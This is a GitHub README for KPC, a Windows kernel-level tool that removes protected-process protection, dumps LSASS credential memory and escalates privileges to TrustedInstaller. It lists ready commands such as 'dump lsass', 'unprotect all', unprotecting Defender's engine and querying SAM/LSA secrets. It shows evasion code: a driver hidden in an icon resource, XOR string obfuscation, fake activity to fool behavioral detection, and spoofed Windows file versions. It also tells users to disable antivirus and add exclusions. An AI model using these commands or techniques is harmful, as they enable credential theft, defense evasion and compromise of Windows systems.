# KPC - Kernel Process Control

<div align="center">

![KPC Logo](docs/images/Screen01.jpg)

**Advanced Windows Process Protection and Memory Dumping Tool**

[![License](https://img.shields.io/badge/License-Dual%20Licensed-blue.svg)](LICENSE.md)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64%20(x86%20legacy)-green.svg)]()
[![Version](https://img.shields.io/badge/Version-1.0.1-orange.svg)]()
[![Language](https://img.shields.io/badge/Language-C%2B%2B20-red.svg)]()
[![Architecture](https://img.shields.io/badge/Architecture-Kernel%20Level-purple.svg)]()
[![Download](https://img.shields.io/badge/Download-Official%20Binary-success.svg)](https://github.com/wesmar/kpc/releases/latest/download/kpc.zip)

**Ring-0 Memory Acquisition and Process Protection Manipulation Framework**  
**Features Dynamic Kernel Driver Loading with Steganographic Concealment**

[📥 Download](#download) • [🚀 Quick Start](#quick-start) • [🔧 Architecture](#technical-architecture) • [⚡ Usage](#usage-examples) • [📋 Features](#core-capabilities) • [🔒 Security](#security-architecture--anti-analysis) • [📄 License](#legal--licensing)

</div>

---

## 🎯 Executive Summary

**KPC (Kernel Process Control)** is a single-file Windows kernel manipulation tool operating at **Ring-0 privilege level**, designed to overcome limitations of traditional forensic tools in Windows 11 environments. Developed as a response to the increasing incompatibility of established tools like ProcDump, Process Explorer, Mimikatz, and pypykatz with modern Windows security features, KPC provides comprehensive **process protection manipulation**, **memory dumping**, and **privilege escalation capabilities** through direct kernel access.

The framework operates without installation requirements, embedding an **encrypted kernel driver within its resources using steganographic techniques**. Upon execution, KPC dynamically extracts, decrypts (XOR cipher), and loads its helper driver to establish Ring-0 access, enabling direct manipulation of **EPROCESS kernel structures**.

### Target Audience

**Primary:** Security researchers, digital forensics investigators, incident response teams  
**Secondary:** System administrators requiring kernel-level access for troubleshooting  
**Academic:** Universities and research institutions studying Windows internals

---

## 📥 Download

### Official Binary (Recommended)

<div align="center">

**[Download KPC v1.0.1 - Official Release](https://github.com/wesmar/kpc/releases/latest/download/kpc.zip)**

**Full Functionality • CRC32: 8A13D946 • All Features Enabled**

</div>

| Download Option | Functionality | Ring-0 Access | Target Audience |
|---|---|---|---|
| **[📦 Official Binary](https://github.com/wesmar/kpc/releases/latest/download/kpc.zip)** | ✅ **Complete** - All kernel operations | ✅ Full driver | Production use, Security research |
| **[🔨 Source Compilation](#compilation-instructions)** | ⚡ **Partial** - TrustedInstaller only | ❌ Corrupted driver | Educational, Custom builds |

### Binary Verification
```bash
# Verify official binary integrity
CertUtil -hashfile kpc.exe SHA256
# Expected CRC32: 8A13D946
# File size: ~200KB (complete framework)
```

---

## 🔧 Technical Architecture

### System Architecture Overview

KPC implements a **layered architecture with atomic operation management**:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         User Mode Components                            │
├───────────────┬─────────────────────────┬───────────────────────────────┤
│   CLI Parser  │     Pattern Matcher     │      Output Formatter         │
├───────────────┴─────────────────────────┴───────────────────────────────┤
│                         Controller Core                                 │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                     Atomic Operation Manager                      │  │
│  │  PerformAtomicInit() → Execute() → PerformAtomicCleanup()         │  │
│  │  Driver lifecycle: Load() → Execute() → Unload()                  │  │
│  └───────────────────────────────────────────────────────────────────┘  │
├─────────────────────────────────────────────────────────────────────────┤
│                      Kernel Interface Layer                             │
├─────────────┬─────────────┬─────────────────┬───────────────────────────┤
│   KVC       │   Offset    │    Process      │    TrustedInstaller       │
│   Driver    │   Finder    │    Manager      │    Integrator             │
├─────────────┴─────────────┴─────────────────┴───────────────────────────┤
│                      Ring-0 Kernel Driver                               │
│                     (Helper Driver - kvc.sys)                           │
│                         IOCTL Communication                             │
│                0x80002048 (READ) / 0x8000204C (WRITE)                   │
└─────────────────────────────────────────────────────────────────────────┘
```

### EPROCESS Structure Manipulation

KPC achieves process protection modification through **dynamic offset resolution** and **direct kernel memory writes**:

#### Offset Discovery Algorithm
```cpp
// Dynamic EPROCESS offset resolution
bool OffsetFinder::FindAllOffsets() {
    // Load ntoskrnl.exe for analysis
    HMODULE kernel = LoadLibraryW(L"ntoskrnl.exe");
    
    // Extract from exported functions
    auto pPsGetProcessId = GetProcAddress(kernel, "PsGetProcessId");
    auto pPsIsProtectedProcess = GetProcAddress(kernel, "PsIsProtectedProcess");
    
    // Parse instruction bytes for offsets
    // UniqueProcessId: Typically +0x440 (Windows 11)
    // Protection: +0x87A  
    // SignatureLevel: +0x878
    
    return BuildOffsetMap();
}
```

#### Protection Level Encoding
```
EPROCESS Protection Byte Structure (+0x87A):
┌───────────┬───────────┐
│ Bits 7-4  │ Bits 3-0  │
├───────────┼───────────┤
│  Signer   │   Level   │
└───────────┴───────────┘

Protection Levels:        Signer Types:
0x0 - None               0x0 - None
0x1 - PPL               0x1 - Authenticode  
0x2 - PP                0x6 - WinTcb
                        0x7 - WinSystem
```

---

## 🚀 Quick Start

### Prerequisites & Installation
```bash
# System Requirements
- OS: Windows 10/11 (x64 recommended, x86 legacy possible)
- Privileges: Administrator rights required  
- Architecture: 64-bit Intel/AMD processors
- Memory: Minimum 4GB RAM

# Option 1: Download the official binary (RECOMMENDED)
# Password: github.com
# Link: https://github.com/wesmar/kpc/releases/latest/download/kpc.7z
# Unpack, place it in the system folder (System32), and add it to exclusions.
# If you are using only Windows Defender, you can run from the command line:
#   kpc add-exclusion
# Use it and enjoy!

# Note: Some antivirus programs may incorrectly flag this tool as malicious.
# This is a false positive — the tool is safe to use.
# If this occurs, temporarily disable real-time protection during download and extraction.


# Option 2: Compile from source (partial functionality)
git clone https://github.com/wesmar/kpc.git
cd kpc
# See compilation section for build instructions
```

### Basic Usage Commands
```bash
# Display help and command syntax
kpc.exe

# List all protected processes with color-coded visualization
kpc.exe list

# Dump LSASS process (bypassing PPL protection)
kpc.exe dump lsass

# Launch command prompt with TrustedInstaller privileges (25+ privileges enabled)
kpc.exe trusted cmd.exe

# Query protection status of specific process
kpc.exe info lsass
```

---

## 📋 Core Capabilities

### 1. 💾 Advanced Memory Dumping Operations

![Memory Dumping Demo](docs/images/Screen02.jpg)

#### LSASS Memory Acquisition Process
KPC implements sophisticated **LSASS protection bypass** through kernel-level privilege escalation:

```
LSASS Dump Execution Flow:
┌─────────────────────────────────────────────┐
│ 1. Identify LSASS process (PID resolution)  │
│ 2. Query protection: PPL-WinTcb (0x61)      │  
│ 3. Elevate self to PP-WinSystem (0x72)      │
│ 4. OpenProcess(PROCESS_VM_READ)             │
│ 5. MiniDumpWriteDump() with full memory     │
│ 6. Extract: DPAPI keys, Kerberos tickets    │
│ 7. Restore original protections             │
│ 8. Atomic cleanup and driver unload         │
└─────────────────────────────────────────────┘
```

#### Memory Dump Contents
**LSASS dumps contain critical authentication artifacts:**
- **DPAPI master keys** for encrypted file recovery
- **Kerberos TGTs and service tickets** for timeline reconstruction  
- **NTLM hashes** for pass-the-hash analysis
- **Cached domain credentials** from memory structures
- **LSA secrets** including auto-logon passwords
- **WDigest cleartext passwords** (if enabled)

**Performance:** LSASS (512MB) dumps in 2-5 seconds with automatic privilege escalation.

### 2. 🔐 Process Protection Management

![Protected Processes List](docs/images/Screen03.jpg)

#### Protection Hierarchy Bypass
KPC manipulates Windows **PP/PPL protection boundaries** through direct EPROCESS modification:

```cpp
// Protection modification example
bool SetProcessProtection(DWORD pid, UCHAR level, UCHAR signer) {
    auto kernelAddr = GetProcessKernelAddress(pid);
    ULONG_PTR protectionAddr = kernelAddr + m_protectionOffset;
    UCHAR protectionByte = (signer << 4) | level;
    
    return m_driver->Write8(protectionAddr, protectionByte);
}
```

#### Supported Protection Levels
- **PP (Protected Process)** - Highest protection level
- **PPL (Protected Process Light)** - Medium protection 
- **Signer types:** Authenticode, CodeGen, Antimalware, Lsa, Windows, WinTcb, WinSystem, App

### 3. ⚡ TrustedInstaller Privilege Escalation 

#### Maximum Privilege Acquisition
KPC achieves **TrustedInstaller-level access** with comprehensive privilege set:

| Privilege Name | Description | Impact |
|---|---|---|
| `SeLockMemoryPrivilege` | Lock pages in memory | Kernel-level control |
| `SeDebugPrivilege` | Debug all processes | Unrestricted process access |
| `SeTakeOwnershipPrivilege` | Take file ownership | Complete ACL bypass |
| `SeLoadDriverPrivilege` | Load kernel drivers | Ring-0 access |
| `SeBackupPrivilege` | Backup all files | SAM/SECURITY hive access |
| `SeRestorePrivilege` | Restore all files | System file modification |
| `SeTcbPrivilege` | Act as OS | Trusted computing base |
| **...and 18+ additional privileges** | **System-level authority** | **Maximum access** |

#### Token Impersonation Chain
```
Privilege Escalation Sequence:
Admin Token → SYSTEM Token → TrustedInstaller Token
     ↓              ↓                    ↓
Limited Access → High Access → Unrestricted Access
```

### 4. 🛡️ Anti-Analysis & Stealth Features

#### Steganographic Driver Concealment
**Advanced techniques for avoiding detection:**

```cpp
// Driver extraction from icon resource
std::vector<BYTE> ExtractEncryptedDriver() {
    auto iconData = ReadResource(IDR_MAINICON, RT_RCDATA);
    // Extract hidden driver after legitimate icon data (offset +9662)
    return std::vector<BYTE>(iconData.begin() + 9662, iconData.end());
}

// XOR decryption with obfuscated key
std::vector<BYTE> DecryptDriver(const std::vector<BYTE>& encrypted) {
    auto key = OBFSTR("[REDACTED]"); // Key removed for security
    for (size_t i = 0; i < encrypted.size(); ++i) {
        decrypted[i] = encrypted[i] ^ key[i % key.size()];
    }
    return decrypted;
}
```

#### String Obfuscation System
**Compile-time XOR encryption prevents static analysis:**
```cpp
// Obfuscation macros with runtime decryption
#define OBFAPI(api)   XorDecrypt(api, 0x7A)     // API names
#define OBFPROC(proc) XorDecrypt(proc, 0x7A7A)  // Process names  
#define OBFREG(key)   XorDecrypt(key, 0x7A7A)   // Registry paths
#define OBFSVC(svc)   XorDecrypt(svc, 0x7A7A)   // Service names
```

---

## ⚡ Usage Examples

### Memory Forensics Operations
```bash
# Emergency LSASS dump during ransomware attack
kpc.exe dump lsass C:\Evidence\
# Output: lsass_664.dmp (contains encryption keys before lockdown)

# Dump specific process by PID with protection bypass
kpc.exe dump 1234

# Batch dump critical processes  
kpc.exe dump explorer && kpc.exe dump winlogon

# Dump protected antimalware engine (requires Antimalware-level protection)
kpc.exe dump MsMpEng.exe
```

### Process Protection Analysis & Manipulation  
```bash
# Comprehensive protected process enumeration with color coding
kpc.exe list
# Shows: PID, Name, Protection Level, Signer, Signature Levels, Kernel Address

# Detailed process information with dumpability analysis
kpc.exe info lsass
# Output: Protection status, signature levels, dump feasibility

# Remove PPL protection from LSASS for analysis
kpc.exe unprotect lsass

# Apply Antimalware-level protection to custom security tool
kpc.exe protect MySecurityTool.exe PPL Antimalware

# Mass unprotection for system analysis (POWERFUL!)
kpc.exe unprotect all

# Batch protection removal with comma-separated targets
kpc.exe unprotect "664,1234,lsass,MsMpEng"
```

### System Integration & Administrative Tasks
```bash
# Launch PowerShell with maximum system privileges
kpc.exe trusted powershell.exe -ExecutionPolicy Bypass

# Execute system file modifications bypassing ACLs
kpc.exe trusted icacls "C:\Windows\System32\drivers\etc\hosts" /grant Everyone:F

# Direct SAM/SECURITY registry access for credential extraction  
kpc.exe trusted reg query "HKLM\SAM\SAM\Domains\Account\Users"

# Install right-click context menu integration
kpc.exe install-context

# Add KPC to Windows Defender exclusions automatically
kpc.exe add-exclusion

# Run application with TrustedInstaller privileges and arguments
kpc.exe trusted "C:\Tools\forensic-tool.exe" --analyze --deep-scan
```

---

## 🔒 Security Architecture & Anti-Analysis

### Advanced Protection Mechanisms

#### Steganographic Resource Embedding
```
Driver Concealment Architecture:
┌─────────────────────────────────────────────┐
│         kpc.exe Resource Section            │
├─────────────────────────────────────────────┤
│ Bytes 0-9661:    Legitimate icon data       │
│ Bytes 9662-end:  Encrypted kvc.sys          │ 
│                  XOR key: [REDACTED]        │
└─────────────────────────────────────────────┘
```

The kernel driver is **hidden within the icon resource** using steganographic techniques, making static analysis significantly more difficult.

#### Runtime String Decryption  
**All sensitive strings are XOR-encrypted at compile time:**
- API function names (CreateFileW, OpenProcess)
- Process names (lsass.exe, csrss.exe)  
- Registry paths (SOFTWARE\Microsoft\Windows)
- Service names (TrustedInstaller)
- File paths (C:\Windows\System32)

#### Dynamic API Loading
```cpp
// Runtime API resolution to avoid static imports
bool InitDynamicAPIs() {
    g_advapi32 = LoadLibraryA(OBFAPI("advapi32.dll"));
    g_pCreateServiceW = (decltype(&CreateServiceW))
        GetProcAddress(g_advapi32, OBFAPI("CreateServiceW"));
    // ... additional APIs loaded dynamically
}
```

#### Anti-Analysis Delays
**Behavioral detection countermeasures:**
```cpp
void GenerateFakeActivity() {
    // Fake registry operations to confuse behavioral analysis
    HKEY hKey;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
        OBFREG(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion"), 0, KEY_READ, &hKey);
    if (hKey) RegCloseKey(hKey);
    
    // Random timing delays for evasion
    Sleep(50 + (GetTickCount() % 100));
}
```

### Atomic Operations for System Stability

#### Driver Lifecycle Management
**Every operation follows strict atomic sequences:**
```cpp
bool PerformAtomicOperation() {
    // Phase 1: Complete cleanup of any existing state
    PerformAtomicCleanup();
    
    // Phase 2: Fresh driver initialization  
    if (!PerformAtomicInit()) return false;
    
    // Phase 3: Execute requested operation
    bool result = ExecuteOperation();
    
    // Phase 4: Mandatory cleanup regardless of success/failure
    PerformAtomicCleanup();
    
    return result;
}
```

This **atomic pattern prevents driver conflicts** and ensures clean system state after every operation.

---

## 📊 Performance & Compatibility

### Operation Performance Metrics
| Operation | Typical Duration | Resource Usage |
|---|---|---|
| Driver Load/Unload | 50-100ms | +2MB RAM |
| Process Enumeration | 10-20ms | +1-5MB RAM |  
| Protection Modification | 1-5ms per process | Minimal |
| LSASS Dump (512MB) | 2-5 seconds | +500MB peak |
| TrustedInstaller Start | 100-500ms | +50MB temp |
| Registry Hive Access | 10-50ms | Minimal |

### Windows Version Compatibility Matrix
| Windows Version | Support Status | Notes |
|---|---|---|
| Windows 10 1903+ | ✅ Full compatibility | All features |
| Windows 11 21H2+ | ✅ Full compatibility | Tested builds |
| Windows 11 24H2 | ✅ Full compatibility | Latest version |
| Server 2019/2022 | ✅ Full compatibility | Enterprise ready |

### Security Feature Impact Assessment
| Security Feature | Compatibility | Impact |
|---|---|---|
| Secure Boot | ✅ Compatible | Driver loads successfully |
| HVCI Enabled | ✅ Compatible | No kernel code injection |
| VBS/VSM | ✅ Compatible | Operates in allowed boundaries |
| WDAC Policy | ✅ Compatible | Legitimate driver operations |
| Credential Guard | ✅ Compatible | LSASS access not restricted |
| Windows Defender | ⚠️ May flag | Add to exclusions recommended |

---

## 🔧 Compilation Instructions

### Build Requirements & Configuration  
```bash
# Development Environment
- Visual Studio 2022 with C++20/Latest support
- Windows SDK 10.0 or later
- Administrator privileges for testing

# Clone and build
git clone https://github.com/wesmar/kpc.git
cd kpc  
# Open Kpc.vcxproj in Visual Studio
# Build in Release/x64 configuration
```

### Advanced Build Flags
**KPC uses sophisticated compilation techniques:**
```xml
<!-- Reproducible builds with timestamp masking -->
<AdditionalOptions>/Brepro /GS- /Gy /Gw %(AdditionalOptions)</AdditionalOptions>

<!-- Section merging for smaller binaries -->  
<AdditionalOptions>/MERGE:.rdata=.text /NXCOMPAT</AdditionalOptions>

<!-- Version spoofing - appears as Windows system file -->
<FileVersion>10.0.26100.5770</FileVersion>
<ProductVersion>10.0.26100.5770</ProductVersion>
```

### Compilation Security Notice

**Official KPC binary (CRC: 8A13D946)** contains the complete functional driver and operates with full Ring-0 capabilities.

**The complete source code is publicly available**, but the XOR decryption key has been redacted for security purposes.

**Custom compilations from public source will:**
- ✅ Execute successfully with **full TrustedInstaller functionality** (25+ privileges)
- ✅ Provide **context menu integration** and maximum system privileges  
- ✅ Offer educational value for Windows internals understanding
- ✅ **Extract drivers successfully** but with corrupted/garbage data
- ❌ **Kernel operations will fail** due to non-functional driver content  
- ❌ All protection bypass and memory dumping features will be disabled

**For full kernel-level functionality, use the official binary (CRC: 8A13D946) or request the decryption key.**

### Decryption Key Request Process

The functional XOR decryption key can be provided to verified individuals upon request:

- **Established security researchers** with verifiable academic or professional credentials
- **Digital forensics professionals** working for legitimate law enforcement or corporate security  
- **High-reputation developers** with demonstrated contributions to the security community
- **Academic institutions** conducting legitimate Windows internals research
- **Individuals with documented social trust** and commitment to ethical use

**Key requests should include:**
- Professional background and credentials verification
- Intended use case and specific research objectives  
- Assurance of ethical use (no malware development)
- Contact information for identity verification
- Portfolio of previous security research work

**95% of users compiling from source will receive non-functional kernel drivers**, ensuring responsible use while maintaining educational and TrustedInstaller value.

---

## 🚧 Future Development Roadmap

### Version 2.0 Planned Features

#### Enhanced Credential Extraction Capabilities
Building upon the current LSASS dumping foundation:

- **DPAPI masterkey enumeration** with automatic decryption workflows
- **SAM/SECURITY registry extraction** with integrated hash parsing engines  
- **NTLM hash extraction** directly from memory and registry structures
- **LSA secrets recovery** with full credential reconstruction pipelines
- **Kerberos ticket enumeration** including TGT/TGS extraction and analysis
- **Cached domain credential recovery** from SECURITY hive with automatic decryption
- **WDigest cleartext extraction** when available in LSASS memory space

#### Advanced Memory Analysis Features  
- **Real-time process memory scanning** for credential patterns and signatures
- **Heap analysis tools** for vulnerability research and exploitation development
- **Kernel structure visualization** for educational and reverse engineering purposes  
- **Memory pattern recognition** for automated credential and key identification

#### Registry Forensics Enhancement
- **Automatic bootkey extraction** from SYSTEM hive for SAM decryption
- **LSA secret enumeration** with integrated decryption using derived keys
- **Cached credential parsing** with domain controller verification
- **Certificate store analysis** for DPAPI key recovery workflows

These enhancements will position KPC as a **comprehensive credential recovery platform** matching and exceeding capabilities of tools like **Mimikatz**, while maintaining professional-grade security standards and ethical use guidelines.

---

## 🚨 Critical Use Cases & Applications

### Incident Response Scenarios

#### Ransomware Attack Response Protocol
**Time-critical credential preservation during active encryption:**

```
Emergency Response Sequence:
┌────────────────────────────────────────────┐
│ T+0min:  Ransomware activity detected      │
│ T+2min:  Immediate LSASS memory dump       │
│          kpc.exe dump lsass C:\Evidence\   │
│ T+3min:  Extract critical process contexts │
│          kpc.exe dump explorer winlogon    │
│ T+5min:  SAM/SECURITY hive backup          │ 
│          kpc.exe trusted reg save HKLM\SAM │
│ T+7min:  Offline analysis for recovery     │
│          Extract DPAPI keys, domain creds  │
└────────────────────────────────────────────┘
```

**Recovery artifacts preserved:**
- **Encryption master keys** before ransomware lockdown
- **Domain cached credentials** for lateral movement analysis  
- **Kerberos authentication tickets** for timeline reconstruction
- **Local user password hashes** for emergency access recovery

#### Advanced Persistent Threat (APT) Investigation
**Long-term credential compromise analysis:**
```bash  
# Comprehensive memory acquisition for APT analysis
kpc.exe dump lsass && kpc.exe dump csrss && kpc.exe dump winlogon

# Protected service analysis for persistence mechanisms
kpc.exe list | findstr "Antimalware\|WinTcb\|WinSystem" 

# Registry forensics for credential caching analysis
kpc.exe trusted reg query "HKLM\SECURITY\Policy\Secrets"
```

### Digital Forensics Applications

#### Corporate Security Breach Response  
**Enterprise-grade forensic acquisition:**
- **Protected process dumping** including security software analysis
- **Credential timeline reconstruction** through Kerberos ticket analysis
- **Privilege escalation path analysis** via protection level auditing
- **Malware persistence mechanism identification** through kernel structure analysis

#### Law Enforcement Digital Evidence
**Authorized forensic operations:**
- **Suspect workstation credential recovery** for case development
- **Encrypted file recovery** through DPAPI master key extraction
- **Network authentication artifact** preservation for prosecution
- **Timeline reconstruction** through comprehensive memory analysis

### Security Research Applications

#### Windows Internals Research
**Academic and professional security research:**
- **EPROCESS structure analysis** across Windows versions
- **Protection mechanism validation** for security boundary testing
- **Kernel security feature assessment** including HVCI/VBS impact
- **Authentication protocol implementation** analysis through memory dumps

---

## 📚 Technical Documentation

### Extended Documentation Structure
```
📁 docs/
├── 📁 images/
│   ├── Screen01.jpg          # Main interface
│   ├── Screen02.jpg          # Memory dumping demo  
│   └── Screen03.jpg          # Protected processes list
├── 📁 diagrams/
│   ├── architecture.svg      # System architecture diagram
│   ├── process-flow.svg      # Operation flow charts
│   └── eprocess-layout.svg   # EPROCESS structure layout
└── 📁 technical/
    ├── ARCHITECTURE.md        # Detailed system architecture
    ├── FORENSICS.md          # Forensic applications guide
    ├── API-REFERENCE.md      # Driver IOCTL documentation  
    ├── COMPATIBILITY.md      # Windows version compatibility
    └── TROUBLESHOOTING.md    # Common issues and solutions
```

**For comprehensive technical documentation:**  
- [📖 System Architecture Details](docs/technical/ARCHITECTURE.md)  
- [🔍 Forensic Applications Guide](docs/technical/FORENSICS.md)
- [⚙️ Driver API Reference](docs/technical/API-REFERENCE.md)
- [🛠️ Troubleshooting Guide](docs/technical/TROUBLESHOOTING.md)

---

## 📄 Legal & Licensing

### Dual Licensing Model
KPC operates under a **professional dual licensing structure**:

- **🎓 Non-Commercial License** - Free for education, research, and personal security analysis
- **💼 Commercial License** - Required for business operations, enterprise deployment, and revenue-generating activities

**For detailed licensing terms and commercial pricing:** [📄 LICENSE.md](LICENSE.md)

### Authorized Use Cases & Legal Framework

#### Legitimate Applications
✅ **Security research** and vulnerability assessment with proper authorization  
✅ **Digital forensics** by qualified professionals with legal mandate  
✅ **Incident response** for authorized network defense operations  
✅ **Academic research** in controlled educational environments  
✅ **System administration** for enterprise troubleshooting scenarios

#### Legal Compliance Requirements  
- ✅ Written authorization from system owners or legal authority
- ✅ Compliance with applicable local, national, and international laws
- ✅ Proper data handling and retention policies  
- ✅ Audit trail maintenance for forensic accountability
- ✅ Secure storage and disposal of acquired memory dumps

#### Prohibited Uses
❌ **Unauthorized access** to computer systems or networks  
❌ **Malware development** or incorporation into malicious software  
❌ **Credential theft** for unauthorized network access  
❌ **Privacy violations** without legal justification or consent

### Liability Limitations & Disclaimers

**THIS SOFTWARE OPERATES AT WINDOWS KERNEL LEVEL WITH ELEVATED PRIVILEGES.**

**The author and WESMAR - Marek Wesołowski assume no liability for:**
- System instability, conflicts, or Blue Screen of Death (BSOD) incidents
- Data loss or corruption resulting from improper usage
- Legal consequences arising from unauthorized or improper use
- Conflicts with antivirus software or security solutions  

**RECOMMENDATION:** Add `kpc.exe` to security software exclusion lists for optimal operation.

---

## 📞 Contact & Professional Services

### Commercial Licensing & Enterprise Support

**WESMAR - Marek Wesołowski**  
📧 **Primary Contact:** [marek@wesolowski.eu.org](mailto:marek@wesolowski.eu.org)  
📱 **WhatsApp/Signal:** [+48 607 440 283](https://wa.me/48607440283)  
🌐 **Website:** [https://kvc.pl](https://kvc.pl)  
📥 **Official Binary:** [Download kpc.zip](https://github.com/wesmar/kpc/releases/latest/download/kpc.zip)

**Business Registration Details:**  
Company: WESMAR - Marek Wesołowski  
Address: Raabego 2b/81, 07-973 Warszawa, Poland  
Tax ID (NIP): 7991668581  
Statistical Number (REGON): 140406890  

### Professional Services Offered

#### Custom Development & Integration
- **Bespoke kernel driver development** for specialized security applications
- **Custom forensic tool development** tailored to specific enterprise requirements  
- **Integration services** for existing security infrastructure platforms
- **Performance optimization** for large-scale deployment scenarios

#### Training & Consultation  
- **Windows internals training** for security teams and developers
- **Kernel-level security workshops** covering EPROCESS manipulation techniques
- **Incident response consultation** for complex breach scenarios  
- **Forensic methodology development** for law enforcement agencies

#### Response Time Commitments
- **Commercial inquiries:** Within 24 hours  
- **Technical support** (licensed users): Within 48 hours  
- **Emergency incident response:** Within 8 hours (premium support)
- **General questions:** Within 72 hours

### Security Research Collaboration

**Academic institutions and security researchers are encouraged to contact for:**
- Research collaboration opportunities in Windows security analysis
- Educational licensing arrangements for university curricula  
- Technical knowledge sharing and peer review processes
- Conference presentation and publication collaborations

---

## 🤝 Contributing & Development

### Contributing to KPC Development
We welcome contributions from qualified security researchers and kernel developers:

1. **Fork** the repository to your GitHub account
2. **Create feature branch** (`git checkout -b feature/EnhancedForensics`)  
3. **Implement changes** following existing architectural patterns
4. **Test thoroughly** in isolated virtual machine environments
5. **Commit with descriptive messages** (`git commit -m 'Add DPAPI masterkey extraction'`)
6. **Push to branch** (`git push origin feature/EnhancedForensics`)
7. **Create Pull Request** with detailed description of changes and testing results

### Development Guidelines & Standards

#### Code Quality Requirements  
- **Professional documentation** with comprehensive inline comments
- **Error handling** using modern C++ exception safety patterns  
- **Memory safety** through RAII and smart pointer usage
- **Thread safety** considerations for multi-threaded operations
- **Performance optimization** with minimal resource overhead

#### Security Considerations
- **Input validation** for all user-provided parameters
- **Privilege management** following principle of least privilege  
- **Clean resource management** preventing resource leaks
- **Anti-analysis resistance** maintaining obfuscation effectiveness

#### Testing Requirements
- **Virtual machine testing** in isolated environments only
- **Multiple Windows versions** compatibility verification  
- **Edge case handling** for unusual system configurations
- **Performance benchmarking** for regression detection

---

## 🔍 Keywords & Technical Tags

### Core Technologies & Techniques
**Windows Internals:** EPROCESS, Process Protection, PPL Bypass, Kernel Structures, Ring-0 Access, IOCTL Communication, Dynamic Offset Resolution, Kernel Driver Loading

**Memory Forensics:** LSASS Dump, Memory Acquisition, Process Memory Analysis, Credential Extraction, DPAPI Keys, Kerberos Tickets, NTLM Hashes, Memory Patterns

**Authentication Systems:** Windows Authentication, Active Directory, Cached Credentials, LSA Secrets, SAM Registry, SECURITY Hive, Domain Controller, Pass-the-Hash

**Privilege Escalation:** TrustedInstaller, Token Manipulation, Privilege Elevation, SeDebugPrivilege, SeTcbPrivilege, ACL Bypass, Registry Access, System Integration

**Anti-Analysis:** String Obfuscation, XOR Encryption, Steganography, Dynamic API Loading, Runtime Decryption, Behavioral Evasion, Static Analysis Prevention

**System Programming:** C++ Kernel Development, Assembly Language, Driver Development, System Service, RAII Pattern, Atomic Operations, Memory Management

### Security Research Applications  
**Incident Response:** Ransomware Analysis, APT Investigation, Breach Response, Timeline Reconstruction, Artifact Recovery, Emergency Access, Credential Timeline

**Digital Forensics:** Evidence Acquisition, Protected Process Analysis, Kernel Forensics, Registry Analysis, Memory Analysis, Credential Recovery, Chain of Custody

**Vulnerability Research:** Windows Security Boundaries, Protection Mechanism Analysis, Kernel Security, Authentication Protocol Analysis, Privilege Escalation Research

**Penetration Testing:** Internal Security Assessment, Credential Access Testing, Privilege Escalation, Lateral Movement, Security Control Bypass, Red Team Operations

### Technical Compatibility
**Windows Versions:** Windows 10, Windows 11, Windows Server 2019, Windows Server 2022, Build Compatibility, Version Independence, Offset Resolution

**Security Features:** Secure Boot, HVCI, VBS, WDAC, Credential Guard, Windows Defender, BitLocker, TPM Integration, Hardware Security

**Development Tools:** Visual Studio 2022, Windows SDK, C++20, Kernel Development, Driver Development, Assembly Programming, Reverse Engineering

---

<div align="center">

**© 2025 WESMAR - Marek Wesołowski**  
*Advanced Windows Security Research & Kernel Development*

*Use responsibly. Knowledge is power; great power requires great responsibility.*

[![GitHub stars](https://img.shields.io/github/stars/wesmar/kpc.svg?style=social)](https://github.com/wesmar/kpc/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/wesmar/kpc.svg?style=social)](https://github.com/wesmar/kpc/network)
[![GitHub issues](https://img.shields.io/github/issues/wesmar/kpc.svg)](https://github.com/wesmar/kpc/issues)
[![GitHub license](https://img.shields.io/github/license/wesmar/kpc.svg)](https://github.com/wesmar/kpc/blob/main/LICENSE.md)

</div>